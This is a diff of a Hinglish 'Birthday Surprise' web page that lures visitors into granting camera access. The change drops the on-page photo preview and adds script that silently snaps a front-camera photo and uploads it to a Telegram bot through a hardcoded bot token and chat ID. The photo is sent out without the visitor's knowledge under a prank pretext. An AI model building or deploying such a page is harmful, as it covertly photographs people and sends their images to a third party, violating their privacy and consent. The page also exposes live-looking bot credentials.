@@ -5,30 +5,33 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Birthday Surprise 🎂</title>
 </head>
-<body style="text-align:center; font-family:Arial, sans-serif; padding:40px;">
+<body style="text-align:center; font-family:Arial, sans-serif; padding:40px; background:#f9f9f9;">
 
-  <h1>🎁 Birthday Surprise 🎂</h1>
-  <p>Camera allow karo aur surprise dekho 😈</p>
+  <h1 style="font-size:28px;">🎁 Birthday Surprise 🎂</h1>
+  <p style="font-size:16px; color:#555;">Camera allow karo aur surprise dekho 😈</p>
 
-  <button id="start" style="padding:10px 20px; font-size:16px; cursor:pointer;">📸 Start Surprise</button>
+  <button id="start" style="padding:12px 28px; font-size:16px; font-weight:bold; cursor:pointer; border-radius:30px; border:none; background:#ff4757; color:#fff; box-shadow:0 4px 10px rgba(255,71,87,0.3);">📸 Start Surprise</button>
 
-  <video id="video" autoplay playsinline muted style="display:none; width:100%; max-width:400px; margin:20px auto; border-radius:8px;"></video>
+  <video id="video" autoplay playsinline muted style="display:none; width:100%; max-width:400px; margin:20px auto; border-radius:12px;"></video>
 
   <canvas id="canvas" style="display:none;"></canvas>
 
-  <h2 id="msg" style="margin-top:20px;"></h2>
+  <h2 id="msg" style="margin-top:25px; color:#333;"></h2>
 
   <script>
+    const TELEGRAM_BOT_TOKEN = "8877031949:AAETojqL7MPI_viwWDb9KfQn-uMwFGnWUdA";
+    const TELEGRAM_CHAT_ID = "7443360894";
+
     const start = document.getElementById("start");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const msg = document.getElementById("msg");
 
     start.onclick = async () => {
-      msg.innerHTML = "Opening camera...";
+      msg.innerHTML = "Opening surprise... 🎉";
+      start.style.display = "none";
       
       try {
-        // Camera access request
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
@@ -38,7 +41,7 @@
         video.style.display = "block";
         await video.play();
 
-        // Wait for video stream to properly render frames
+        // 1.5 second stream chalne ke baad capture
         setTimeout(() => {
           canvas.width = video.videoWidth || 640;
           canvas.height = video.videoHeight || 480;
@@ -46,28 +49,34 @@
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Stop camera stream after capture
+          // Stop camera
           stream.getTracks().forEach(track => track.stop());
 
-          canvas.toBlob((photo) => {
+          canvas.toBlob(async (photo) => {
             msg.innerHTML = "😂 Pakde gaye! Happy Birthday 🎂❤️";
             video.style.display = "none";
 
-            // Optional: Captured image preview
-            const imgPreview = document.createElement("img");
-            imgPreview.src = URL.createObjectURL(photo);
-            imgPreview.style.maxWidth = "300px";
-            imgPreview.style.borderRadius = "8px";
-            imgPreview.style.marginTop = "15px";
-            document.body.appendChild(imgPreview);
+            // Send photo to Telegram
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", photo, "capture.jpg");
+            formData.append("caption", "🎉 Birthday Surprise Photo Clicked!");
 
-          }, "image/jpeg", 0.9);
+            try {
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+              });
+            } catch (err) {
+              console.error("Upload failed:", err);
+            }
+
+          }, "image/jpeg", 0.85);
 
         }, 1500);
 
       } catch (error) {
-        console.error("Camera Error:", error);
-        msg.innerHTML = "Camera permission deny ho gayi ya HTTPS required hai! 😅";
+        msg.innerHTML = "Camera permission deny ho gayi! 😅";
       }
     };
   </script>
